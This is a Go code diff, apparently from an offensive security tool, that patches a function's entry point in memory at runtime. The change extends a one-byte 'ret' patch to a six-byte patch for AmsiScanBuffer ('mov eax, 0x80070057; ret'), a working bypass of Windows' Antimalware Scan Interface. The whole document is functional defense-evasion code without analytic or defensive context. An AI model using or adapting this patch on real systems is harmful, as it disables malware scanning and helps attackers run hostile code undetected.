@@ -36,15 +36,24 @@ func PerformRetPatch(dllName, functionName string) (string, error) {
 
 	funcAddr := proc.Addr()
 
-	// Save original byte for reporting
-	originalByte := *(*byte)(unsafe.Pointer(funcAddr))
+	patchBytes := []byte{0xC3}
+	if functionName == "AmsiScanBuffer" {
+		patchBytes = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3} // mov eax, 0x80070057; ret
+	}
+	patchLen := uintptr(len(patchBytes))
+
+	// Save original bytes for reporting
+	originalBytes := make([]byte, patchLen)
+	for i := uintptr(0); i < patchLen; i++ {
+		originalBytes[i] = *(*byte)(unsafe.Pointer(funcAddr + i))
+	}
 
 	// Change memory protection to PAGE_EXECUTE_READWRITE so we can write
 	procVirtualProtect := kernel32.NewProc("VirtualProtect")
 	var oldProtect uint32
 	ret, _, err := procVirtualProtect.Call(
 		funcAddr,
-		1, // just 1 byte
+		patchLen,
 		uintptr(PAGE_EXECUTE_READWRITE),
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
@@ -52,20 +61,22 @@ func PerformRetPatch(dllName, functionName string) (string, error) {
 		return "", fmt.Errorf("memory protection change failed: %v", err)
 	}
 
-	// Write 0xC3 (ret) at the function entry point
-	*(*byte)(unsafe.Pointer(funcAddr)) = 0xC3
+	// Write the patch at the function entry point
+	for i := uintptr(0); i < patchLen; i++ {
+		*(*byte)(unsafe.Pointer(funcAddr + i)) = patchBytes[i]
+	}
 
 	// Restore original memory protection
 	var discardProtect uint32
 	procVirtualProtect.Call(
 		funcAddr,
-		1,
+		patchLen,
 		uintptr(oldProtect),
 		uintptr(unsafe.Pointer(&discardProtect)),
 	)
 
 	output := fmt.Sprintf("[+] Ret patch applied: %s!%s at 0x%X\n", dllName, functionName, funcAddr)
-	output += fmt.Sprintf("[+] Overwrote 0x%02X with 0xC3 (ret)\n", originalByte)
+	output += fmt.Sprintf("[+] Overwrote 0x%X with 0x%X\n", originalBytes, patchBytes)
 
 	return output, nil
 }
